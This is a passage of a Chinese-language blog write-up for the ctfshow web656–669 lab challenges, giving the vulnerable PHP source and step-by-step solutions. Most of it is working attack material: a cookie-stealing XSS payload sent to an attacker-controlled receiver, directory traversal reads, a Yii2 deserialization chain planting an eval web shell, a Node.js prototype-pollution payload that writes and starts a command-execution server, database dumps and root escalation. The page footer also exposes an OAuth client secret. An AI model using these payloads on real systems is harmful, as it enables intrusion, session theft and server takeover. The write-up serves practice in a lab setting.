+# @Author: h1xa
+# @Date:   2021-08-04 15:54:48
+# @Last Modified by:   h1xa
+# @Last Modified time: 2021-08-05 00:43:36
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+include 'dbutil.php';
+include 'flag.php';
+
+error_reporting(0);
+session_start();
+
+
+$a=$_GET['action'];
+
+switch ($a){
+    case 'login':
+    	$ret = login($_GET['u'],$_GET['p']);
+        break;
+    case 'index':
+    	$ret = index();
+        break;
+    case 'main':
+    	$ret = main($_GET['m']);
+    	break;
+    default:
+         $ret = json_encode(array(
+		'code'=&gt;0,
+		'message'=&gt;'数据获取失败',
+		));
+		break;
+}
+
+
+echo $ret;
+
+
+function index(){
+    $html='管理员请注意，下面是最近登陆失败用户：&lt;br&gt;';
+    $ret=db::query('select username,login_time,login_ip from ctfshow_logs  order by id desc limit 3');
+    foreach ($ret as $r) {
+    	$html .='------------&lt;br&gt;用户名: '.htmlspecialchars($r[0]).'&lt;br&gt;登陆失败时间: '
+    	.$r[1]
+    	.'&lt;br&gt;登陆失败IP: '
+    	.$r[2].
+    	'&lt;br&gt;------------&lt;br&gt;';
+    }
+    return $html;
+    
+}
+
+function login($u,$p){
+	$ret = array(
+	'code'=&gt;0,
+	'message'=&gt;'数据获取失败',
+	);
+	$u = addslashes($u);
+	$p = addslashes($p);
+	$res = db::query(&quot;select username from ctfshow_users where username = '$u' and password = '$p'&quot;);
+	$date = new DateTime('now');
+	$now = $date-&gt;format('Y-m-d H:i:s');
+	$ip = addslashes(gethostbyname($_SERVER['HTTP_X_FORWARDED_FOR']));
+	
+
+	if(count($res)==0){
+ 		 db::insert(&quot;insert into `ctfshow_logs` (`username`,`login_time`,`login_ip`) values ('$u','$now','$ip')&quot;);
+		 $ret['message']='账号或密码错误';
+		 return json_encode($ret);
+	}
+
+	if(!auth()){
+		$ret['message']='AuthKey 错误';
+	}else{
+		$ret['message']='登陆成功';
+		$_SESSION['login']=true;
+		$_SESSION['flag_660']=$_GET['flag'];
+	}
+
+	return json_encode($ret);
+
+
+}
+
+function auth(){
+	$auth = base64_decode($_COOKIE['auth']);
+	return $auth==AUTH_KEY;
+}
+
+function getFlag(){
+	return  FLAG_657;
+}
+
+function testFile($f){
+	$result = '';
+	$file = $f.md5(md5(random_int(1,10000)).md5(random_int(1,10000))).'.php';
+	if(file_exists($file)){
+		$result = FLAG_658;
+	}
+	return $result;
+
+}
+
+
+function main($m){
+	$ret = array(
+	'code'=&gt;0,
+	'message'=&gt;'数据获取失败',
+	);
+	if($_SESSION['login']==true){
+		
+		switch ($m) {
+			case 'getFlag':
+				$ret['message']=getFlag();
+				break;
+			case 'testFile':
+				$ret['message']=testFile($_GET['f']);
+				break;
+			default:
+				# code...
+				break;
+		}
+		
+
+	}else{
+		$ret['message']='请先登陆';
+	}
+
+	return json_encode($ret);
+}
+
+</code></pre>
+<p>index页面只对用户名进行了转义，而登录ip我们也是可以控制得。</p>
+<p>先写个xss的接收端<br>
+xss.php</p>
+<pre><code class="language-php">&lt;?php
+    file_put_contents(&quot;info.txt&quot;,$_GET['cookie']);
+</code></pre>
+<p>xss payload</p>
+<pre><code>curl -H &quot;X-Forwarded-for:@header.txt&quot; http://172.2.97.5/index.php?action=login&amp;u=1&amp;p=1
+</code></pre>
+<p>header.txt</p>
+<pre><code>&lt;script&gt;window.location.href=String.fromCharCode(104,116,116,112,58,47,47,49,55,50,46,50,46,57,55,46,52,47,120,115,115,46,112,104,112,63,99,111,111,107,105,101,61)+document.cookie;&lt;/script&gt;
+//根据需要修改地址：'http://172.2.97.4/xss.php?cookie='
+</code></pre>
+<p>查看info.txt内容，接收到cookie</p>
+<pre><code>PHPSESSID=15kkrpp1aoj1merne68li5n6l2; auth=ZmxhZ182NTY9Y3Rmc2hvd3tlMGI4MGQ2Yjk5ZDJiZGJhZTM2ZjEyMWY3OGFiZTk2Yn0=
+</code></pre>
+<p>将auth解码后得到flag</p>
+<p>flag_656=ctfshow{e0b80d6b99d2bdbae36f121f78abe96b}</p>
+<h2 id="web657">web657</h2>
+<p>使用cookie登录<br>
+蚁剑中的shell很多字符会冲突，比如<code>; ``&amp;</code>,需要进行转义</p>
+<pre><code class="language-sh">curl --cookie &quot;PHPSESSID=15kkrpp1aoj1merne68li5n6l2&quot;  &quot;http://172.2.97.5/index.php?action=main\&amp;m=getFlag&quot;
+</code></pre>
+<p>flag_657=ctfshow{2a73f8f87a58a13c23818fafd83510b1}</p>
+<h2 id="web658">web658</h2>
+<p>分析testFIle函数，要求生成随机文件名，然后用file_exists()函数判断存在文件。</p>
+<p>服务器上有python3,使用python脚本，模拟ftp应答。</p>
+<pre><code class="language-python">import socket
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.bind(('0.0.0.0', 21))
+s.listen(1)
+print('listening 0.0.0.0 21\n')
+conn, addr = s.accept()
+conn.send(b'220 a\n')
+conn.send(b'230 a\n')
+conn.send(b'200 a\n')
+conn.send(b'200 a\n')
+conn.send(b'200\n')
+conn.send(b'200 a\n')
+conn.send(b'200\n')
+conn.send(b'200 a\n')
+conn.close()
+</code></pre>
+<p>payload</p>
+<pre><code class="language-sh">curl --cookie &quot;PHPSESSID=15kkrpp1aoj1merne68li5n6l2&quot;  &quot;http://172.2.97.5/index.php?action=main\&amp;m=testFile\&amp;f=ftp://172.2.97.4/a&quot;
+</code></pre>
+<p>flag_658=ctfshow{98555a97cb23e7413d261142e65a674f}</p>
+<h2 id="web659">web659</h2>
+<p>扫描目录发现robots.txt<br>
+查看内容发现存在public目录<br>
+查看public目录</p>
+<pre><code class="language-html">&lt;html&gt;
+&lt;head&gt;&lt;title&gt;Index of /public/&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;
+&lt;h1&gt;Index of /public/&lt;/h1&gt;&lt;hr&gt;&lt;pre&gt;&lt;a href=&quot;../&quot;&gt;../&lt;/a&gt;
+&lt;a href=&quot;Readme.txt&quot;&gt;Readme.txt&lt;/a&gt;                                         07-Aug-2021 19:51                 123
+&lt;/pre&gt;&lt;hr&gt;&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>Readme.txt内容</p>
+<pre><code>恭喜师傅来到第二关！
+
+第二关相比第一关，依旧是没有难度。
+
+glhf!
+
+               ctshow 大菜鸡
+</code></pre>
+<p>这里存在目录穿越，访问<code>/publi../</code><br>
+<img src="https://fallingskies22.github.io/post-images/1713615090561.png" alt="" loading="lazy"></p>
+<p>找到FLAG目录下存在flag</p>
+<pre><code class="language-sh">wget http://172.2.97.5/public../FLAG/flag659.txt
+</code></pre>
+<p>flag_659=ctfshow{73c4213829f8b393b2082bacb4253cab}</p>
+<h2 id="web660">web660</h2>
+<p>从www.zip中的index.php知道flag_660可能在log中。</p>
+<pre><code>if(!auth()){
+      $ret['message']='AuthKey 错误';
+   }else{
+      $ret['message']='登陆成功';
+      $_SESSION['login']=true;
+      $_SESSION['flag_660']=$_GET['flag'];
+   }
+</code></pre>
+<p>读取日志文件</p>
+<pre><code class="language-sh">wget http://172.2.97.5/public../var/log/nginx/ctfshow_web_access_log_file_you_never_know.log
+</code></pre>
+<p>找到flag</p>
+<pre><code>[20/Apr/2024:10:02:28 +0000]:172.2.97.6-GET /index.php HTTP/1.1-200
+[20/Apr/2024:10:02:30 +0000]:172.2.97.6-GET /index.php?action=login&amp;u=admin&amp;p=nE7jA5m&amp;flag=flag_660_ctfshow{23e56d95b430de80c7b5806f49a14a2b} HTTP/1.1-200
+[20/Apr/2024:10:02:32 +0000]:172.2.97.6-GET /index.php?action=index HTTP/1.1-200
+</code></pre>
+<p>flag_660=ctfshow{23e56d95b430de80c7b5806f49a14a2b}</p>
+<h2 id="web661">web661</h2>
+<pre><code class="language-sh">wget http://172.2.97.5/public../home/flag/secret.txt
+</code></pre>
+<p>flag_661=ctfshow{d41c308e12fdecf7782eeb7c20f45352}</p>
+<h2 id="web662">web662</h2>
+<pre><code class="language-sh">wget http://172.2.97.5/public../home/www-data/creater.sh
+</code></pre>
+<p>creater.sh</p>
+<pre><code class="language-sh">#!/bin/sh
+
+file=`echo $RANDOM|md5sum|cut -c 1-3`.html
+echo 'flag_663=ctfshow{xxxx}' &gt; /var/www/html/$file
+</code></pre>
+<p>生成3个随机字母名的文件</p>
+<p>编写脚本进行爆破</p>
+<pre><code class="language-python">import requests
+
+
+list='0123456789abcdef'
+
+for i in list:
+    for j in list:
+        for k in list:
+            r = requests.get(url=&quot;http://172.2.97.5/&quot;+str(i)+str(j)+str(k)+&quot;.html&quot;).text
+            if(&quot;404&quot; not in r):
+                print(r)
+                break
+</code></pre>
+<p>蚁剑中执行python脚本回显看不到，将结果写入到output.txt<br>
+使用</p>
+<pre><code>python3 burp.py &gt; output.txt
+</code></pre>
+<p>flag_662=ctfshow{fa5cc1fb0bfc986d1ef150269c0de197}</p>
+<h2 id="web663">web663</h2>
+<p>从phpinfo.php得到extention目录<br>
+<img src="https://fallingskies22.github.io/post-images/1713618837334.png" alt="" loading="lazy"></p>
+<pre><code class="language-sh">wget http://172.2.97.5/public../usr/local/lib/php/extensions/no-debug-non-zts-20180731
+</code></pre>
+<p>目录下有个ctfshow.so</p>
+<pre><code class="language-sh">wget http://172.2.97.5/public../usr/local/lib/php/extensions/no-debug-non-zts-20180731/ctfshow.so
+</code></pre>
+<figure data-type="image" tabindex="7"><img src="https://fallingskies22.github.io/post-images/1713619063538.png" alt="" loading="lazy"></figure>
+<p>得到flag<br>
+flag_663=ctfshow{fa5cc1fb0bfc986d1ef150269c0de197}</p>
+<h2 id="web664">web664</h2>
+<p>根据之前端口扫描结果，8888端口开放了一个oa</p>
+<pre><code class="language-sh">curl http://172.2.97.5:8888
+</code></pre>
+<figure data-type="image" tabindex="8"><img src="https://fallingskies22.github.io/post-images/1713621000380.png" alt="" loading="lazy"></figure>
+<p>根据链接提示，以及YII指纹信息</p>
+<p>使用反序列化payload，参考文章https://cn-sec.com/archives/710314.html<br>
+这里payload需要两次urlencode。</p>
+<pre><code class="language-php">&lt;?php
+namespace Codeception\Extension{
+    use Faker\DefaultGenerator;
+    use GuzzleHttp\Psr7\AppendStream;
+    class  RunProcess{
+        protected $output;
+        private $processes = [];
+        public function __construct(){
+            $this-&gt;processes[]=new DefaultGenerator(new AppendStream());
+            $this-&gt;output=new DefaultGenerator('jiang');
+        }
+    }
+    echo urlencode(urlencode(serialize(new RunProcess())));
+}
+
+namespace Faker{
+    class DefaultGenerator
+    {
+        protected $default;
+
+        public function __construct($default = null)
+        {
+            $this-&gt;default = $default;
+        }
+    }
+}
+namespace GuzzleHttp\Psr7{
+    use Faker\DefaultGenerator;
+    final class AppendStream{
+        private $streams = [];
+        private $seekable = true;
+        public function __construct(){
+            $this-&gt;streams[]=new CachingStream();
+        }
+    }
+    final class CachingStream{
+        private $remoteStream;
+        public function __construct(){
+            $this-&gt;remoteStream=new DefaultGenerator(false);
+            $this-&gt;stream=new  PumpStream();
+        }
+    }
+    final class PumpStream{
+        private $source;
+        private $size=-10;
+        private $buffer;
+        public function __construct(){
+            $this-&gt;buffer=new DefaultGenerator('j');
+            include(&quot;closure/autoload.php&quot;);
+            $a = function(){highlight_file('/var/oa/flag664.php');die();};
+            $a = \Opis\Closure\serialize($a);
+            $b = unserialize($a);
+            $this-&gt;source=$b;
+        }
+    }
+}
+</code></pre>
+<p>这里需要注意，反序列化中使用了闭包函数，参考文章https://www.anquanke.com/post/id/251366#h2-6</p>
+<p>正常的闭包函数不可以反序列化，需要导入依赖<br>
+https://github.com/opis/closure</p>
+<p>因为YII2中刚好使用了这个依赖，所以构造反序列化链可以使用它，主要是为了解决<code>call_user_func()</code>函数只有第一个参数可控的情况。</p>
+<p>访问获取参数名<br>
+<img src="https://fallingskies22.github.io/post-images/1713692737981.png" alt="" loading="lazy"></p>
+<p>传参根据报错信息知道还要传入key<br>
+并且下面泄露了nginx和yii2的版本号<br>
+<img src="https://fallingskies22.github.io/post-images/1713693395709.png" alt="" loading="lazy"></p>
+<p>payload</p>
+<pre><code>echo `curl &quot;http://172.2.170.5:8888/index.php?r=site%2Funserialize%26key=flag_663=ctfshow\{fa5cc1fb0bfc986d1ef150269c0de197\}&quot; -d &quot;UnserializeForm[ctfshowUnserializeData]=O%253A32%253A%2522Codeception%255CExtension%255CRunProcess%2522%253A2%253A%257Bs%253A9%253A%2522%2500%252A%2500output%2522%253BO%253A22%253A%2522Faker%255CDefaultGenerator%2522%253A1%253A%257Bs%253A10%253A%2522%2500%252A%2500default%2522%253Bs%253A5%253A%2522jiang%2522%253B%257Ds%253A43%253A%2522%2500Codeception%255CExtension%255CRunProcess%2500processes%2522%253Ba%253A1%253A%257Bi%253A0%253BO%253A22%253A%2522Faker%255CDefaultGenerator%2522%253A1%253A%257Bs%253A10%253A%2522%2500%252A%2500default%2522%253BO%253A28%253A%2522GuzzleHttp%255CPsr7%255CAppendStream%2522%253A2%253A%257Bs%253A37%253A%2522%2500GuzzleHttp%255CPsr7%255CAppendStream%2500streams%2522%253Ba%253A1%253A%257Bi%253A0%253BO%253A29%253A%2522GuzzleHttp%255CPsr7%255CCachingStream%2522%253A2%253A%257Bs%253A43%253A%2522%2500GuzzleHttp%255CPsr7%255CCachingStream%2500remoteStream%2522%253BO%253A22%253A%2522Faker%255CDefaultGenerator%2522%253A1%253A%257Bs%253A10%253A%2522%2500%252A%2500default%2522%253Bb%253A0%253B%257Ds%253A6%253A%2522stream%2522%253BO%253A26%253A%2522GuzzleHttp%255CPsr7%255CPumpStream%2522%253A3%253A%257Bs%253A34%253A%2522%2500GuzzleHttp%255CPsr7%255CPumpStream%2500source%2522%253BC%253A32%253A%2522Opis%255CClosure%255CSerializableClosure%2522%253A212%253A%257Ba%253A5%253A%257Bs%253A3%253A%2522use%2522%253Ba%253A0%253A%257B%257Ds%253A8%253A%2522function%2522%253Bs%253A57%253A%2522function%2528%2529%257B%255Chighlight_file%2528%2527%252Fvar%252Foa%252Fflag664.php%2527%2529%253Bdie%2528%2529%253B%257D%2522%253Bs%253A5%253A%2522scope%2522%253Bs%253A26%253A%2522GuzzleHttp%255CPsr7%255CPumpStream%2522%253Bs%253A4%253A%2522this%2522%253BN%253Bs%253A4%253A%2522self%2522%253Bs%253A32%253A%2522000000003e2c05af0000000026b075cb%2522%253B%257D%257Ds%253A32%253A%2522%2500GuzzleHttp%255CPsr7%255CPumpStream%2500size%2522%253Bi%253A-10%253Bs%253A34%253A%2522%2500GuzzleHttp%255CPsr7%255CPumpStream%2500buffer%2522%253BO%253A22%253A%2522Faker%255CDefaultGenerator%2522%253A1%253A%257Bs%253A10%253A%2522%2500%252A%2500default%2522%253Bs%253A1%253A%2522j%2522%253B%257D%257D%257D%257Ds%253A38%253A%2522%2500GuzzleHttp%255CPsr7%255CAppendStream%2500seekable%2522%253Bb%253A1%253B%257D%257D%257D%257D
+&quot;`;
+</code></pre>
+<figure data-type="image" tabindex="9"><img src="https://fallingskies22.github.io/post-images/1713694404122.png" alt="" loading="lazy"></figure>
+<p>flag_664=ctfshow{35802d184dba134bdc8d0d23e09051f7}</p>
+<h2 id="web665">web665</h2>
+<pre><code class="language-sh">wget http://172.2.97.5/public../FLAG665
+</code></pre>
+<p>flag_665=ctfshow{35802d184dba134bdc8d0d23e09051f7}</p>
+<h2 id="web666">web666</h2>
+<p>flag在oa主机的数据库中</p>
+<p>使用前面的反序列化漏洞执行任意命令。</p>
+<pre><code class="language-php">&lt;?php
+namespace Codeception\Extension{
+    use Faker\DefaultGenerator;
+    use GuzzleHttp\Psr7\AppendStream;
+    class  RunProcess{
+        protected $output;
+        private $processes = [];
+        public function __construct(){
+            $this-&gt;processes[]=new DefaultGenerator(new AppendStream());
+            $this-&gt;output=new DefaultGenerator('jiang');
+        }
+    }
+    echo urlencode(urlencode(serialize(new RunProcess())));
+}
+
+namespace Faker{
+    class DefaultGenerator
+    {
+        protected $default;
+
+        public function __construct($default = null)
+        {
+            $this-&gt;default = $default;
+        }
+    }
+}
+namespace GuzzleHttp\Psr7{
+    use Faker\DefaultGenerator;
+    final class AppendStream{
+        private $streams = [];
+        private $seekable = true;
+        public function __construct(){
+            $this-&gt;streams[]=new CachingStream();
+        }
+    }
+    final class CachingStream{
+        private $remoteStream;
+        public function __construct(){
+            $this-&gt;remoteStream=new DefaultGenerator(false);
+            $this-&gt;stream=new  PumpStream();
+        }
+    }
+    final class PumpStream{
+        private $source;
+        private $size=-10;
+        private $buffer;
+        public function __construct(){
+            $this-&gt;buffer=new DefaultGenerator('j');
+            include(&quot;closure/autoload.php&quot;);
+            $a = function(){eval(base64_decode($_REQUEST[&quot;x&quot;]));die();};
+            $a = \Opis\Closure\serialize($a);
+            $b = unserialize($a);
+            $this-&gt;source=$b;
+        }
+    }
+}
+</code></pre>
+<p>sql.php</p>
+<pre><code class="language-php">$conn = new mysqli('localhost','root','root','ctfshow');
+$res = $conn-&gt;query(&quot;select * from ctfshow_secret&quot;);
+if($res){
+   $row=$res-&gt;fetch_array(MYSQLI_BOTH);
+}
+echo $row[0];
+$conn-&gt;close();
+</code></pre>
+<p>将sql.php进行base64后，再urlencode两次，传入x参数。<br>
+payload</p>
+<pre><code>echo `curl &quot;http://172.2.170.5:8888/index.php?r=site%2Funserialize%26key=flag_663=ctfshow\{fa5cc1fb0bfc986d1ef150269c0de197\}%26x=JGNvbm4gPSBuZXcgbXlzcWxpKCdsb2NhbGhvc3QnLCdyb290Jywncm9vdCcsJ2N0ZnNob3cnKTsNCiRyZXMgPSAkY29ubi0%252bcXVlcnkoInNlbGVjdCAqIGZyb20gY3Rmc2hvd19zZWNyZXQiKTsNCmlmKCRyZXMpew0KICAgJHJvdz0kcmVzLT5mZXRjaF9hcnJheShNWVNRTElfQk9USCk7DQp9DQplY2hvICRyb3dbMF07DQokY29ubi0%252bY2xvc2UoKTs=&quot; -d &quot;UnserializeForm[ctfshowUnserializeData]=O%253A32%253A%2522Codeception%255CExtension%255CRunProcess%2522%253A2%253A%257Bs%253A9%253A%2522%2500%252A%2500output%2522%253BO%253A22%253A%2522Faker%255CDefaultGenerator%2522%253A1%253A%257Bs%253A10%253A%2522%2500%252A%2500default%2522%253Bs%253A5%253A%2522jiang%2522%253B%257Ds%253A43%253A%2522%2500Codeception%255CExtension%255CRunProcess%2500processes%2522%253Ba%253A1%253A%257Bi%253A0%253BO%253A22%253A%2522Faker%255CDefaultGenerator%2522%253A1%253A%257Bs%253A10%253A%2522%2500%252A%2500default%2522%253BO%253A28%253A%2522GuzzleHttp%255CPsr7%255CAppendStream%2522%253A2%253A%257Bs%253A37%253A%2522%2500GuzzleHttp%255CPsr7%255CAppendStream%2500streams%2522%253Ba%253A1%253A%257Bi%253A0%253BO%253A29%253A%2522GuzzleHttp%255CPsr7%255CCachingStream%2522%253A2%253A%257Bs%253A43%253A%2522%2500GuzzleHttp%255CPsr7%255CCachingStream%2500remoteStream%2522%253BO%253A22%253A%2522Faker%255CDefaultGenerator%2522%253A1%253A%257Bs%253A10%253A%2522%2500%252A%2500default%2522%253Bb%253A0%253B%257Ds%253A6%253A%2522stream%2522%253BO%253A26%253A%2522GuzzleHttp%255CPsr7%255CPumpStream%2522%253A3%253A%257Bs%253A34%253A%2522%2500GuzzleHttp%255CPsr7%255CPumpStream%2500source%2522%253BC%253A32%253A%2522Opis%255CClosure%255CSerializableClosure%2522%253A210%253A%257Ba%253A5%253A%257Bs%253A3%253A%2522use%2522%253Ba%253A0%253A%257B%257Ds%253A8%253A%2522function%2522%253Bs%253A55%253A%2522function%2528%2529%257Beval%2528%255Cbase64_decode%2528%2524_REQUEST%255B%2522x%2522%255D%2529%2529%253Bdie%2528%2529%253B%257D%2522%253Bs%253A5%253A%2522scope%2522%253Bs%253A26%253A%2522GuzzleHttp%255CPsr7%255CPumpStream%2522%253Bs%253A4%253A%2522this%2522%253BN%253Bs%253A4%253A%2522self%2522%253Bs%253A32%253A%2522000000007c42ef3d0000000061055bbb%2522%253B%257D%257Ds%253A32%253A%2522%2500GuzzleHttp%255CPsr7%255CPumpStream%2500size%2522%253Bi%253A-10%253Bs%253A34%253A%2522%2500GuzzleHttp%255CPsr7%255CPumpStream%2500buffer%2522%253BO%253A22%253A%2522Faker%255CDefaultGenerator%2522%253A1%253A%257Bs%253A10%253A%2522%2500%252A%2500default%2522%253Bs%253A1%253A%2522j%2522%253B%257D%257D%257D%257Ds%253A38%253A%2522%2500GuzzleHttp%255CPsr7%255CAppendStream%2500seekable%2522%253Bb%253A1%253B%257D%257D%257D%257D
+&quot;`;
+</code></pre>
+<figure data-type="image" tabindex="10"><img src="https://fallingskies22.github.io/post-images/1713696229885.png" alt="" loading="lazy"></figure>
+<p>flag_666=ctfshow{bb4053583279be4e3be880f30ce3e53e}</p>
+<h2 id="web667">web667</h2>
+<p>根据之前扫描到端口</p>
+<pre><code class="language-sh">curl http://172.2.97.5:3000
+</code></pre>
+<p>flag_667=ctfshow{503a075560764e3d116436ab73d7a560}</p>
+<h2 id="web668">web668</h2>
+<p>访问3000端口服务任意路径</p>
+<pre><code>echo `curl &quot;http://172.2.170.5:3000/12&quot;`;
+</code></pre>
+<p>根据报错信息知道，服务端为nodejs<br>
+<img src="https://fallingskies22.github.io/post-images/1713696460208.png" alt="" loading="lazy"></p>
+<p>根据题目的源码提示</p>
+<pre><code class="language-js">/login
+
+utils.copy(user.userinfo,req.body);
+function copy(object1, object2){
+    for (let key in object2) {
+        if (key in object2 &amp;&amp; key in object1) {
+            copy(object1[key], object2[key])
+        } else {
+            object1[key] = object2[key]
+        }
+    }
+  }
+</code></pre>
+<p>copy函数，典型的原型链污染<br>
+这里是利用jade原型链污染写入nodejs</p>
+<p>写入一个aa.js来执行命令，开放端口为8033</p>
+<pre><code class="language-js">var http = require('http');
+var querystring = require('querystring');
+
+var postHTML = '123';
+
+http.createServer(function (req, res) {
+  var body = &quot;&quot;;
+  req.on('data', function (chunk) {
+    body += chunk;
+  });
+  req.on('end', function () {
+    body = querystring.parse(body);
+    res.writeHead(200, {'Content-Type': 'text/html; charset=utf8'});
+ try{
+    if(body.cmd) {
+        res.write(&quot;username：&quot; + body.cmd);
+        var result= global.process.mainModule.constructor._load('child_process').execSync('bash -c &quot;'+body.cmd+'&quot;').toString();
+        res.write(result);
+    } else {
+        res.write(postHTML);
+    }}
+    catch{
+       res.write(postHTML);
+    }
+    res.end();
+  });
+}).listen(8033);
+</code></pre>
+<p>payload</p>
+<pre><code>pass=echo `curl -i -X POST -H 'Content-type':'application/json' -d &quot;{\\&quot;__proto__\\&quot;:{\\&quot;__proto__\\&quot;: {\\&quot;type\\&quot;:\\&quot;Block\\&quot;,\\&quot;nodes\\&quot;:\\&quot;\\&quot;,\\&quot;compileDebug\\&quot;:1,\\&quot;self\\&quot;:1,\\&quot;line\\&quot;:\\&quot;global.process.mainModule.require('child_process').exec('echo YmFzaCAtYyAiZWNobyBkbUZ5SUdoMGRIQWdQU0J5WlhGMWFYSmxLQ2RvZEhSd0p5azdDblpoY2lCeGRXVnllWE4wY21sdVp5QTlJSEpsY1hWcGNtVW9KM0YxWlhKNWMzUnlhVzVuSnlrN0NncDJZWElnY0c5emRFaFVUVXdnUFNBbk1USXpKenNLSUFwb2RIUndMbU55WldGMFpWTmxjblpsY2lobWRXNWpkR2x2YmlBb2NtVnhMQ0J5WlhNcElIc0tJQ0IyWVhJZ1ltOWtlU0E5SUNJaU93b2dJSEpsY1M1dmJpZ25aR0YwWVNjc0lHWjFibU4wYVc5dUlDaGphSFZ1YXlrZ2V3b2dJQ0FnWW05a2VTQXJQU0JqYUhWdWF6c0tJQ0I5S1RzS0lDQnlaWEV1YjI0b0oyVnVaQ2NzSUdaMWJtTjBhVzl1SUNncElIc0tJQ0FnSUdKdlpIa2dQU0J4ZFdWeWVYTjBjbWx1Wnk1d1lYSnpaU2hpYjJSNUtUc0tJQ0FnSUhKbGN5NTNjbWwwWlVobFlXUW9NakF3TENCN0owTnZiblJsYm5RdFZIbHdaU2M2SUNkMFpYaDBMMmgwYld3N0lHTm9ZWEp6WlhROWRYUm1PQ2Q5S1RzS0lIUnllWHNLSUNBZ0lHbG1LR0p2WkhrdVkyMWtLU0I3Q2lBZ0lDQWdJQ0FnY21WekxuZHlhWFJsS0NKMWMyVnlibUZ0WmUrOG1pSWdLeUJpYjJSNUxtTnRaQ2s3Q2lBZ0lDQWdJQ0FnZG1GeUlISmxjM1ZzZEQwZ1oyeHZZbUZzTG5CeWIyTmxjM011YldGcGJrMXZaSFZzWlM1amIyNXpkSEoxWTNSdmNpNWZiRzloWkNnblkyaHBiR1JmY0hKdlkyVnpjeWNwTG1WNFpXTlRlVzVqS0NkaVlYTm9JQzFqSUNJbksySnZaSGt1WTIxa0t5Y2lKeWt1ZEc5VGRISnBibWNvS1RzS0lDQWdJQ0FnSUNCeVpYTXVkM0pwZEdVb2NtVnpkV3gwS1RzS0lDQWdJSDBnWld4elpTQjdDaUFnSUNBZ0lDQWdjbVZ6TG5keWFYUmxLSEJ2YzNSSVZFMU1LVHNLSUNBZ0lIMTlDaUFnSUNCallYUmphSHNLSUNBZ0lDQWdJSEpsY3k1M2NtbDBaU2h3YjNOMFNGUk5UQ2s3SUFvZ0lDQWdmUW9nSUNBZ2NtVnpMbVZ1WkNncE93b2dJSDBwT3dwOUtTNXNhWE4wWlc0b09EQXpNeWs3Q2c9PXxiYXNlNjQgLWQgPiAvaG9tZS9ub2RlL2FhLmpzO25vZGUgL2hvbWUvbm9kZS9hYS5qcyI=|base64 -d|bash')\\&quot;}}}&quot; http://172.2.170.5:3000/login`;
+</code></pre>
+<figure data-type="image" tabindex="11"><img src="https://fallingskies22.github.io/post-images/1713698873908.png" alt="" loading="lazy"></figure>
+<p>执行任意命令<br>
+payload</p>
+<pre><code>pass=echo `curl -X POST -d &quot;cmd=mysql -uroot -proot -e 'use ctfshow;select * from ctfshow_secret'&quot; http://172.2.170.5:8033`;
+</code></pre>
+<figure data-type="image" tabindex="12"><img src="https://fallingskies22.github.io/post-images/1713699089556.png" alt="" loading="lazy"></figure>
+<p>flag_666=ctfshow{bb4053583279be4e3be880f30ce3e53e}</p>
+<pre><code>pass=echo `curl -X POST -d &quot;cmd=cat secret.txt&quot; http://172.2.170.5:8033`;
+</code></pre>
+<p>flag_668=ctfshow{5b617bd75e1242ab1f6f70437bb71dd5}</p>
+<h2 id="web669">web669</h2>
+<p>查看运行进程中有crontab.sh,并且属于root用户。<br>
+<img src="https://fallingskies22.github.io/post-images/1713699709699.png" alt="" loading="lazy"></p>
+<p>查看内容如下</p>
+<pre><code class="language-sh">#!/bin/sh
+
+while true
+do
+	sh /home/node/nodestartup.sh 
+	sleep 60
+done
+</code></pre>
+<p>修改nodestartup.sh，来提升权限<br>
+payload</p>
+<pre><code>pass=echo `curl -X POST -d &quot;cmd=rm -rf nodestartup.sh;echo 'cat /root/you_win &gt; /home/node/1.txt ' &gt; nodestartup.sh&quot; http://172.2.132.5:8033`;
+</code></pre>
+<pre><code>恭喜你已经拿到了第二个服务器的最高权限，师傅太强了！
+
+你能在未知的网络空间里，抽丝剥茧，层层渗透进来，足以证明你拥有高超的技术实力和旁人不具有的坚韧意志
+
+希望你坚持下去，坚持你的热爱，坚持你喜欢的事情，我想，总有一天，你将获得百倍的回报，并让你受用终身
+
+此刻的坚持，是未来发出的光！
+
+                                               ctfshow 大菜鸡
+                                             2021年8月7日 04:39
+
+flag_669=ctfshow{a6c74ca12174eb538a4c8c8ed99c3a74}
+</code></pre>
+<p>flag_669=ctfshow{a6c74ca12174eb538a4c8c8ed99c3a74}</p>
+
+            </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://fallingskies22.github.io/post/damctf2024-web-writeup/">
+                  <h3 class="post-title">
+                    DamCTF2024 - Web - Writeup
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+              
+                <div id="gitalk-container" data-aos="fade-in"></div>
+              
+
+              
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+  <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  <script>
+    hljs.initHighlightingOnLoad()
+  </script>
+
+
+
+
+  
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+
+      var gitalk = new Gitalk({
+        clientID: '1b08861b8ad19018640e',
+        clientSecret: '1881a7245597aa70e1ffc8412e5b6c1eb0ad7241',
+        repo: 'fallingskies22.github.io',
+        owner: 'fallingskies22',
+        admin: ['fallingskies22'],
+        id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+        distractionFreeMode: false  // Facebook-like distraction free mode
+      })
+
+      gitalk.render('gitalk-container')
+
+    </script>
+  
+
+  
+
+
+
+
+  </body>
+</html>
